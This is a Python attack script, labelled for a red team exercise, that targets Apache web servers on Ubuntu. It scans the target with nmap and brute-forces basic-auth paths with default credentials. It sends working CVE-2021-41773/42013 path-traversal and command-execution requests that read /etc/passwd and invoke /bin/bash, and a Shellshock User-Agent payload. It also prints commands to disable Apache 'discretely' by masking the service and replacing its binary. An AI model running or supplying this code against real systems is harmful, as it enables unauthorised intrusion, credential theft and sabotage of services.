#!/usr/bin/env python3
"""
Ubuntu Apache Attack Script
---------------------------
This script attempts to exploit common vulnerabilities in Apache web servers.
"""

import argparse
import os
import subprocess
import sys
import requests
from concurrent.futures import ThreadPoolExecutor
import re
import socket
import time

def check_dependencies():
    """Check and install required dependencies."""
    required_packages = ["nmap", "metasploit-framework", "hydra", "sslscan"]
    apt_packages = []
    
    print("[*] Checking dependencies...")
    
    for package in required_packages:
        try:
            subprocess.check_output(["which", package.split("-")[0]])
            print(f"[+] {package} is already installed")
        except subprocess.CalledProcessError:
            apt_packages.append(package)
    
    if apt_packages:
        print(f"[*] Installing missing packages: {', '.join(apt_packages)}")
        try:
            subprocess.check_call(["sudo", "apt-get", "update", "-qq"])
            subprocess.check_call(["sudo", "apt-get", "install", "-y"] + apt_packages)
            print("[+] All dependencies installed successfully")
        except subprocess.CalledProcessError:
            print("[-] Failed to install some dependencies. Please install them manually.")
            sys.exit(1)
    
    # Install required Python packages
    try:
        import requests
    except ImportError:
        print("[*] Installing Python requests module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        
    print("[+] All dependencies are satisfied")

def scan_target(target):
    """Scan target to identify Apache version and open ports."""
    print(f"\n[*] Scanning {target} for Apache service details...")
    
    try:
        # Basic port scan for common web ports
        nmap_cmd = ["nmap", "-sV", "-p", "80,443,8080,8443", target, "-oG", "apache_scan.txt"]
        subprocess.run(nmap_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Extract Apache version from scan results
        with open("apache_scan.txt", "r") as f:
            scan_results = f.read()
        
        apache_versions = re.findall(r"Apache/([0-9.]+)", scan_results)
        ports = re.findall(r"(\d+)/open", scan_results)
        
        if apache_versions:
            version = apache_versions[0]
            print(f"[+] Apache version {version} detected")
        else:
            print("[-] Could not determine Apache version")
            version = "unknown"
            
        if ports:
            print(f"[+] Web server running on ports: {', '.join(ports)}")
        else:
            print("[-] No open web ports detected")
            
        return version, ports
    except Exception as e:
        print(f"[-] Error during scanning: {str(e)}")
        return "unknown", []

def check_default_creds(target, ports):
    """Check for default credentials on Apache endpoints."""
    if not ports:
        return False
    
    common_paths = ["/manager/html", "/admin", "/phpmyadmin", "/server-status"]
    common_users = ["admin", "root", "apache", "www-data", "administrator"]
    common_passes = ["admin", "password", "root", "123456", "admin123", "changeme"]
    
    for port in ports:
        base_url = f"http://{target}:{port}"
        
        # Check if basic auth is required on any known paths
        for path in common_paths:
            url = base_url + path
            try:
                resp = requests.get(url, timeout=5)
                
                if resp.status_code == 401 and "WWW-Authenticate" in resp.headers:
                    print(f"[+] Found basic auth at {url}")
                    
                    # Try brute forcing
                    for user in common_users:
                        for password in common_passes:
                            try:
                                auth_resp = requests.get(url, auth=(user, password), timeout=5)
                                if auth_resp.status_code == 200:
                                    print(f"[+] CREDENTIAL FOUND! {user}:{password} at {url}")
                                    return True
                            except:
                                pass
            except:
                pass
    
    return False

def exploit_apache(target, version, ports):
    """Attempt to exploit Apache vulnerabilities based on version."""
    if not ports:
        print("[-] No ports to exploit")
        return False
    
    success = False
    
    # Try some common exploits
    if version != "unknown":
        major, minor = map(int, version.split(".")[:2])
        
        # Apache 2.4.49/2.4.50 Path Traversal (CVE-2021-41773, CVE-2021-42013)
        if (major == 2 and minor == 4 and 
            (version.startswith("2.4.49") or version.startswith("2.4.50"))):
            print(f"[*] Attempting CVE-2021-41773/CVE-2021-42013 Path Traversal on Apache {version}")
            
            for port in ports:
                url = f"http://{target}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
                try:
                    resp = requests.get(url, timeout=5)
                    if "root:" in resp.text:
                        print(f"[+] Path Traversal vulnerable! {url}")
                        print(f"[+] Sample output: {resp.text[:100]}...")
                        success = True
                        
                        # Try to get a shell
                        shell_url = f"http://{target}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash"
                        payload = "echo;id;pwd"
                        shell_resp = requests.get(f"{shell_url}?{payload}", timeout=10)
                        if "uid=" in shell_resp.text:
                            print(f"[+] COMMAND EXECUTION POSSIBLE! Example: {shell_resp.text[:100]}...")
                except:
                    pass
    
    # Check for mod_cgi RCE (Shellshock - CVE-2014-6271)
    print("[*] Checking for Shellshock vulnerability...")
    for port in ports:
        cgi_paths = ["/cgi-bin/", "/cgi/"]
        for cgi_path in cgi_paths:
            try:
                url = f"http://{target}:{port}{cgi_path}test.cgi"
                headers = {
                    "User-Agent": "() { :; }; echo; echo; /bin/bash -c 'id'"
                }
                resp = requests.get(url, headers=headers, timeout=5)
                if "uid=" in resp.text:
                    print(f"[+] Shellshock vulnerable! {url}")
                    print(f"[+] Output: {resp.text[:100]}...")
                    success = True
            except:
                pass
    
    # Check for mod_status information disclosure
    print("[*] Checking for mod_status information disclosure...")
    status_paths = ["/server-status", "/apache-status"]
    for port in ports:
        for path in status_paths:
            try:
                url = f"http://{target}:{port}{path}"
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200 and ("Apache Server Status" in resp.text or "Server Uptime" in resp.text):
                    print(f"[+] Found exposed server status at {url}")
                    success = True
            except:
                pass
                
    return success

def disable_apache(target, version, ports):
    """Attempt to disable Apache service discretely."""
    if not ports:
        print("[-] No ports to attack for service disabling")
        return False
    
    print("\n[*] Attempting to disable Apache service discretely...")
    success = False
    
    # Try to exploit to get a shell and then disable the service
    # This would require successful exploitation first
    
    print("[*] To disable Apache, you would need to:")
    print("    1. Gain shell access through one of the exploits")
    print("    2. Run the following commands:")
    print("       - sudo systemctl mask apache2.service")
    print("       - sudo mv /usr/sbin/apache2 /usr/sbin/apache2.bak")
    print("       - echo '#!/bin/bash' | sudo tee /usr/sbin/apache2")
    print("       - echo 'exit 1' | sudo tee -a /usr/sbin/apache2")
    print("       - sudo chmod +x /usr/sbin/apache2")
    
    return success

def main():
    parser = argparse.ArgumentParser(description="Apache Attack Script for Red Team Exercise")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-u", "--username", help="Username for authentication if known")
    parser.add_argument("-p", "--password", help="Password for authentication if known")
    parser.add_argument("-d", "--domain", help="Domain name if applicable")
    parser.add_argument("--disable", action="store_true", help="Attempt to disable the service")
    
    args = parser.parse_args()
    
    print("\n===== Ubuntu Apache Attack Script =====")
    print(f"[*] Target: {args.target}")
    
    # Check dependencies
    check_dependencies()
    
    # Scan target
    version, ports = scan_target(args.target)
    
    # Check for default credentials
    if args.username and args.password:
        print(f"[*] Using provided credentials: {args.username}:{args.password}")
    else:
        print("[*] Checking for default credentials...")
        check_default_creds(args.target, ports)
    
    # Attempt exploitation
    exploit_success = exploit_apache(args.target, version, ports)
    
    # Disable service if requested
    if args.disable:
        disable_success = disable_apache(args.target, version, ports)
        if disable_success:
            print("[+] Service successfully disabled")
        else:
            print("[-] Failed to disable service")
    
    if exploit_success:
        print("\n[+] Successfully exploited Apache vulnerabilities on target")
    else:
        print("\n[-] Failed to exploit Apache vulnerabilities")

if __name__ == "__main__":
    main()
